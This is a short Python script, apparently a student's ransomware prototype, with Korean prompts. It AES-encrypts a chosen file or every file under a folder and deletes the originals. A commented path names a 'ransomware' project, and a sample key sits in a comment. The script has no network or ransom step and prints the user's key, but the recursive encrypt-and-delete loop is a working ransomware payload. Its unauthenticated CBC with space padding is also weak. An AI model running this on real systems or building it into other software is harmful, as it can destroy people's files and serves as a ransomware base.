import glob
import os, random, struct
from Crypto.Cipher import AES


def encrypt_file(key, in_filename, out_filename=None, chunksize=64 * 1024):
    """ Encrypts a file using AES (CBC mode) with the
        given key.

        key:
            The encryption key - a string that must be
            either 16, 24 or 32 bytes long. Longer keys
            are more secure.

        in_filename:
            Name of the input file

        out_filename:
            If None, '<in_filename>.enc' will be used.

        chunksize:
            Sets the size of the chunk which the function
            uses to read and encrypt the file. Larger chunk
            sizes can be faster for some files and machines.
            chunksize must be divisible by 16.
    """
    if not out_filename:
        out_filename = in_filename + '.enc'

    iv = os.urandom(16)
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))


def decrypt_file(key, in_filename, out_filename=None, chunksize=24 * 1024):
    """ Decrypts a file using AES (CBC mode) with the
        given key. Parameters are similar to encrypt_file,
        with one difference: out_filename, if not supplied
        will be in_filename without its last extension
        (i.e. if in_filename is 'aaa.zip.enc' then
        out_filename will be 'aaa.zip')
    """
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]

    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(origsize)


# key = b'Hj0CfHGrHDt6NIZ3'
se = input("1개에 파일만 암호화할려면 1을 폴더에 있는 파일 전채를 암호화할꺼면 2번을 눌러주세요:")
if se == "1":
    startPath = input("그파일에 경로를 풀로 넣어주세여 예:C:/Users/test.txt:")
if se == "2":
    startPath = input("그폴더를 풀로 넣어주세요 예:C:/Users/:") + "**"
# startPath = 'C:/Users/junse/PycharmProjects/ransomware/file/**'
key2 = input("암호화키를 넣어주세요 무조건 16자리 여야합니다:")
print("암호화 경로는" + startPath)
print("암호화키는" + key2)
key = key2.encode()


# Encrypts all files recursively starting from startPath
for filename in glob.iglob(startPath, recursive=True):
    if (os.path.isfile(filename)):
        print('Encrypting> ' + filename)
        encrypt_file(key, filename)
        os.remove(filename)
print("암호화 완료! 이용해주셔서 감사합니다!")
os.system("pause")